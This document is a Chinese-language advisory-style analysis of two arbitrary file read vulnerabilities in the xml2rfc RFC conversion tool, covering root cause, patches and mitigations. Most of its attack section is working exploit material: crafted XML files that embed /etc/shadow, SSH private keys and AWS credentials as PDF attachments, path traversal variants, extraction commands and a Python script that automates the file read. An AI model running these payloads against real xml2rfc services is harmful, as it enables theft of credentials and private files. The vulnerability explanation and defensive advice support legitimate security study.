# xml2rfc 任意文件读取漏洞分析与POC

## 漏洞概述

该仓库存在两个相关的任意文件读取漏洞：

### 漏洞1: GHSA-cfmv-h8fx-85m7 (CVE-2025-11058)
- **影响版本**: <= 3.30.0
- **修复版本**: 3.30.1
- **CVSS评分**: 8.7 (高危)
- **修复提交**: f2b245bc0aeeac0667c8f74e976c466c5991f0e4

### 漏洞2: GHSA-9mv7-3c64-mmqw (CVE-2025-11059)
- **影响版本**: < 3.30.2
- **修复版本**: 3.30.2
- **CVSS评分**: 8.7 (高危)
- **修复提交**: 73fb1c91fc62ac540bb6bd24f982f2becf84c1b0

## 漏洞原理分析

### 攻击向量

xml2rfc是一个用于生成RFC文档的工具，支持将XML格式转换为多种输出格式（HTML、PDF、TXT等）。在生成PDF文件时，存在以下处理流程：

1. **XML解析阶段**: 解析输入的XML文档
2. **HTML生成阶段**: 通过HtmlWriter将XML转换为HTML
3. **PDF渲染阶段**: 使用WeasyPrint库将HTML渲染为PDF

### 漏洞触发点

在 `xml2rfc/writers/html.py` 中的代码显示：

```python
# 第580-581行
for link in x.xpath('./link'):
    head.append(link)
```

以及 `render_link` 方法（第1798-1800行）：

```python
def render_link(self, h, x):
    link = add.link(h, x, href=x.get('href'), rel=x.get('rel'))
    return link
```

这意味着XML中的 `<link>` 元素会被直接复制到HTML的 `<head>` 中，没有经过任何验证或过滤。

当 `<link>` 标签包含 `rel="attachment"` 属性时，WeasyPrint在生成PDF时会尝试读取 `href` 属性指定的文件并将其作为附件包含在PDF中。这允许攻击者读取服务器文件系统上的任意文件。

### 漏洞差异

- **第一个漏洞 (CVE-2025-11058)**: 通过在普通XML输入中注入恶意link元素触发
- **第二个漏洞 (CVE-2025-11059)**: 通过在"prepped"（预处理后）的RFCXML中注入恶意link元素触发，这是一个补丁绕过

### 修复方案分析

#### 第一次修复 (v3.30.1)
在 `xml2rfc/utils.py` 中添加了 `strip_link_attachments()` 函数：

```python
def strip_link_attachments(tree):
    """
    Find link tags with rel="attachment".
    """
    for attachment in tree.xpath('//link[@rel="attachment"]'):
        xml2rfc.log.warn(f"Removed {attachment}. link relationships type attachment is not allowed.")
        attachment.getparent().remove(attachment)
```

并在 `xml2rfc/writers/base.py` 的 `BaseV3Writer` 类中调用该函数。

**问题**: 这个修复只在writer阶段进行清理，如果输入的是已经prepped的XML文件，可能会绕过这个检查。

#### 第二次修复 (v3.30.2)
将清理逻辑前移到parser阶段：

1. 在 `xml2rfc/parser.py` 中添加 `sanitize()` 方法
2. 在 `xml2rfc/run.py` 的主流程中，在验证后立即调用 `xmlrfc.sanitize()`
3. 从writer阶段移除清理逻辑

这确保了无论输入是普通XML还是prepped XML，都会在早期阶段被清理。

## POC构造

### POC 1: 读取 /etc/passwd (针对CVE-2025-11058)

创建恶意XML文件 `poc_read_passwd.xml`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-poc-test-00" category="info">
  <link rel="item" href="urn:issn:2070-1721"/>
  <link rel="attachment" href="/etc/passwd"/>
  <front>
    <title>POC for Arbitrary File Read</title>
    <author fullname="Security Researcher" initials="S." surname="Researcher">
      <organization>Security Research Lab</organization>
    </author>
    <date year="2025"/>
    <abstract>
      <t>This is a proof of concept for CVE-2025-11058.</t>
    </abstract>
  </front>
  <middle>
    <section anchor="intro">
      <name>Introduction</name>
      <t>This document demonstrates the arbitrary file read vulnerability.</t>
    </section>
  </middle>
  <back/>
</rfc>
```

### POC 2: 读取敏感配置文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-poc-config-00" category="info">
  <link rel="attachment" href="/etc/shadow"/>
  <link rel="attachment" href="/root/.ssh/id_rsa"/>
  <link rel="attachment" href="/home/ubuntu/.aws/credentials"/>
  <front>
    <title>POC for Reading Multiple Sensitive Files</title>
    <author fullname="Security Researcher" initials="S." surname="Researcher">
      <organization>Security Research Lab</organization>
    </author>
    <date year="2025"/>
    <abstract>
      <t>This POC attempts to read multiple sensitive files.</t>
    </abstract>
  </front>
  <middle>
    <section anchor="intro">
      <name>Introduction</name>
      <t>Multiple file read demonstration.</t>
    </section>
  </middle>
  <back/>
</rfc>
```

### POC 3: 相对路径遍历

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-poc-traversal-00" category="info">
  <link rel="attachment" href="../../../../../../etc/passwd"/>
  <link rel="attachment" href="file:///etc/hosts"/>
  <front>
    <title>POC for Path Traversal</title>
    <author fullname="Security Researcher" initials="S." surname="Researcher">
      <organization>Security Research Lab</organization>
    </author>
    <date year="2025"/>
    <abstract>
      <t>This POC tests path traversal variations.</t>
    </abstract>
  </front>
  <middle>
    <section anchor="intro">
      <name>Introduction</name>
      <t>Path traversal demonstration.</t>
    </section>
  </middle>
  <back/>
</rfc>
```

## 漏洞利用方法

### 在易受攻击版本上测试 (xml2rfc <= 3.30.0)

```bash
# 安装易受攻击的版本
pip install xml2rfc==3.30.0

# 使用POC生成PDF
xml2rfc --pdf poc_read_passwd.xml -o output.pdf

# 检查生成的PDF文件
# PDF中会包含/etc/passwd的内容作为附件
```

### 检查PDF附件内容

```bash
# 使用pdfdetach (poppler-utils)查看PDF附件
pdfdetach -list output.pdf

# 提取附件
pdfdetach -saveall output.pdf -o extracted/

# 查看提取的文件
cat extracted/passwd
```

### Python脚本自动化利用

```python
import subprocess
import os

def exploit_file_read(target_file, output_pdf="exploit.pdf"):
    xml_template = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-exploit-00" category="info">
  <link rel="attachment" href="{target}"/>
  <front>
    <title>Exploit</title>
    <author fullname="Test" initials="T." surname="Test">
      <organization>Test</organization>
    </author>
    <date year="2025"/>
    <abstract>
      <t>Test</t>
    </abstract>
  </front>
  <middle>
    <section anchor="intro">
      <name>Introduction</name>
      <t>Test content.</t>
    </section>
  </middle>
  <back/>
</rfc>'''
    
    xml_content = xml_template.format(target=target_file)
    
    # 写入临时XML文件
    with open("exploit.xml", "w") as f:
        f.write(xml_content)
    
    # 执行xml2rfc
    try:
        result = subprocess.run(
            ["xml2rfc", "--pdf", "exploit.xml", "-o", output_pdf],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if os.path.exists(output_pdf):
            print(f"[+] PDF生成成功: {output_pdf}")
            print(f"[+] 尝试读取的文件: {target_file}")
            return True
        else:
            print(f"[-] PDF生成失败")
            print(result.stderr)
            return False
    except Exception as e:
        print(f"[-] 执行出错: {e}")
        return False

# 使用示例
exploit_file_read("/etc/passwd", "passwd.pdf")
exploit_file_read("/etc/hosts", "hosts.pdf")
```

## 防护建议

### 1. 立即升级
- 升级到 xml2rfc >= 3.30.2 版本

### 2. 输入验证
如果无法立即升级，在处理不受信任的XML输入前，应该：

```python
import lxml.etree

def sanitize_xml(xml_content):
    """移除所有rel="attachment"的link标签"""
    tree = lxml.etree.fromstring(xml_content)
    for attachment in tree.xpath('//link[@rel="attachment"]'):
        attachment.getparent().remove(attachment)
    return lxml.etree.tostring(tree)
```

### 3. 沙箱环境
- 在隔离的容器或虚拟机中运行xml2rfc
- 限制文件系统访问权限
- 使用只读挂载敏感目录

### 4. 监控与检测
- 监控xml2rfc进程的文件访问行为
- 检测包含 `rel="attachment"` 的可疑XML输入
- 记录所有文件读取操作

### 5. Web服务防护
如果xml2rfc作为Web服务运行：
- 严格验证上传的XML文件
- 限制输出文件的访问权限
- 实施速率限制
- 记录所有转换请求

## 影响范围评估

### 严重性: 高 (CVSS 8.7)

**原因**:
- **攻击向量**: 网络 (AV:N) - 可通过网络远程利用
- **攻击复杂度**: 低 (AC:L) - 不需要特殊条件
- **权限要求**: 无 (PR:N) - 不需要身份验证
- **用户交互**: 无 (UI:N) - 不需要用户交互
- **机密性影响**: 高 (VC:H) - 可读取任意文件

### 受影响场景

1. **公共RFC转换服务**: 允许用户上传XML并转换为PDF的Web服务
2. **CI/CD管道**: 自动处理不受信任的RFC文档
3. **文档生成系统**: 集成xml2rfc的自动化文档系统
4. **多租户环境**: 共享服务器上运行xml2rfc的环境

## 时间线

- **2025-08-26**: CVE-2025-11058公开，发布v3.30.1修复
- **2025-09-10**: CVE-2025-11059公开（补丁绕过），发布v3.30.2修复
- **2025-11-22**: 本分析文档生成

## 参考链接

- https://github.com/ietf-tools/xml2rfc/security/advisories/GHSA-cfmv-h8fx-85m7
- https://github.com/ietf-tools/xml2rfc/security/advisories/GHSA-9mv7-3c64-mmqw
- https://github.com/ietf-tools/xml2rfc/commit/f2b245bc0aeeac0667c8f74e976c466c5991f0e4
- https://github.com/ietf-tools/xml2rfc/commit/73fb1c91fc62ac540bb6bd24f982f2becf84c1b0
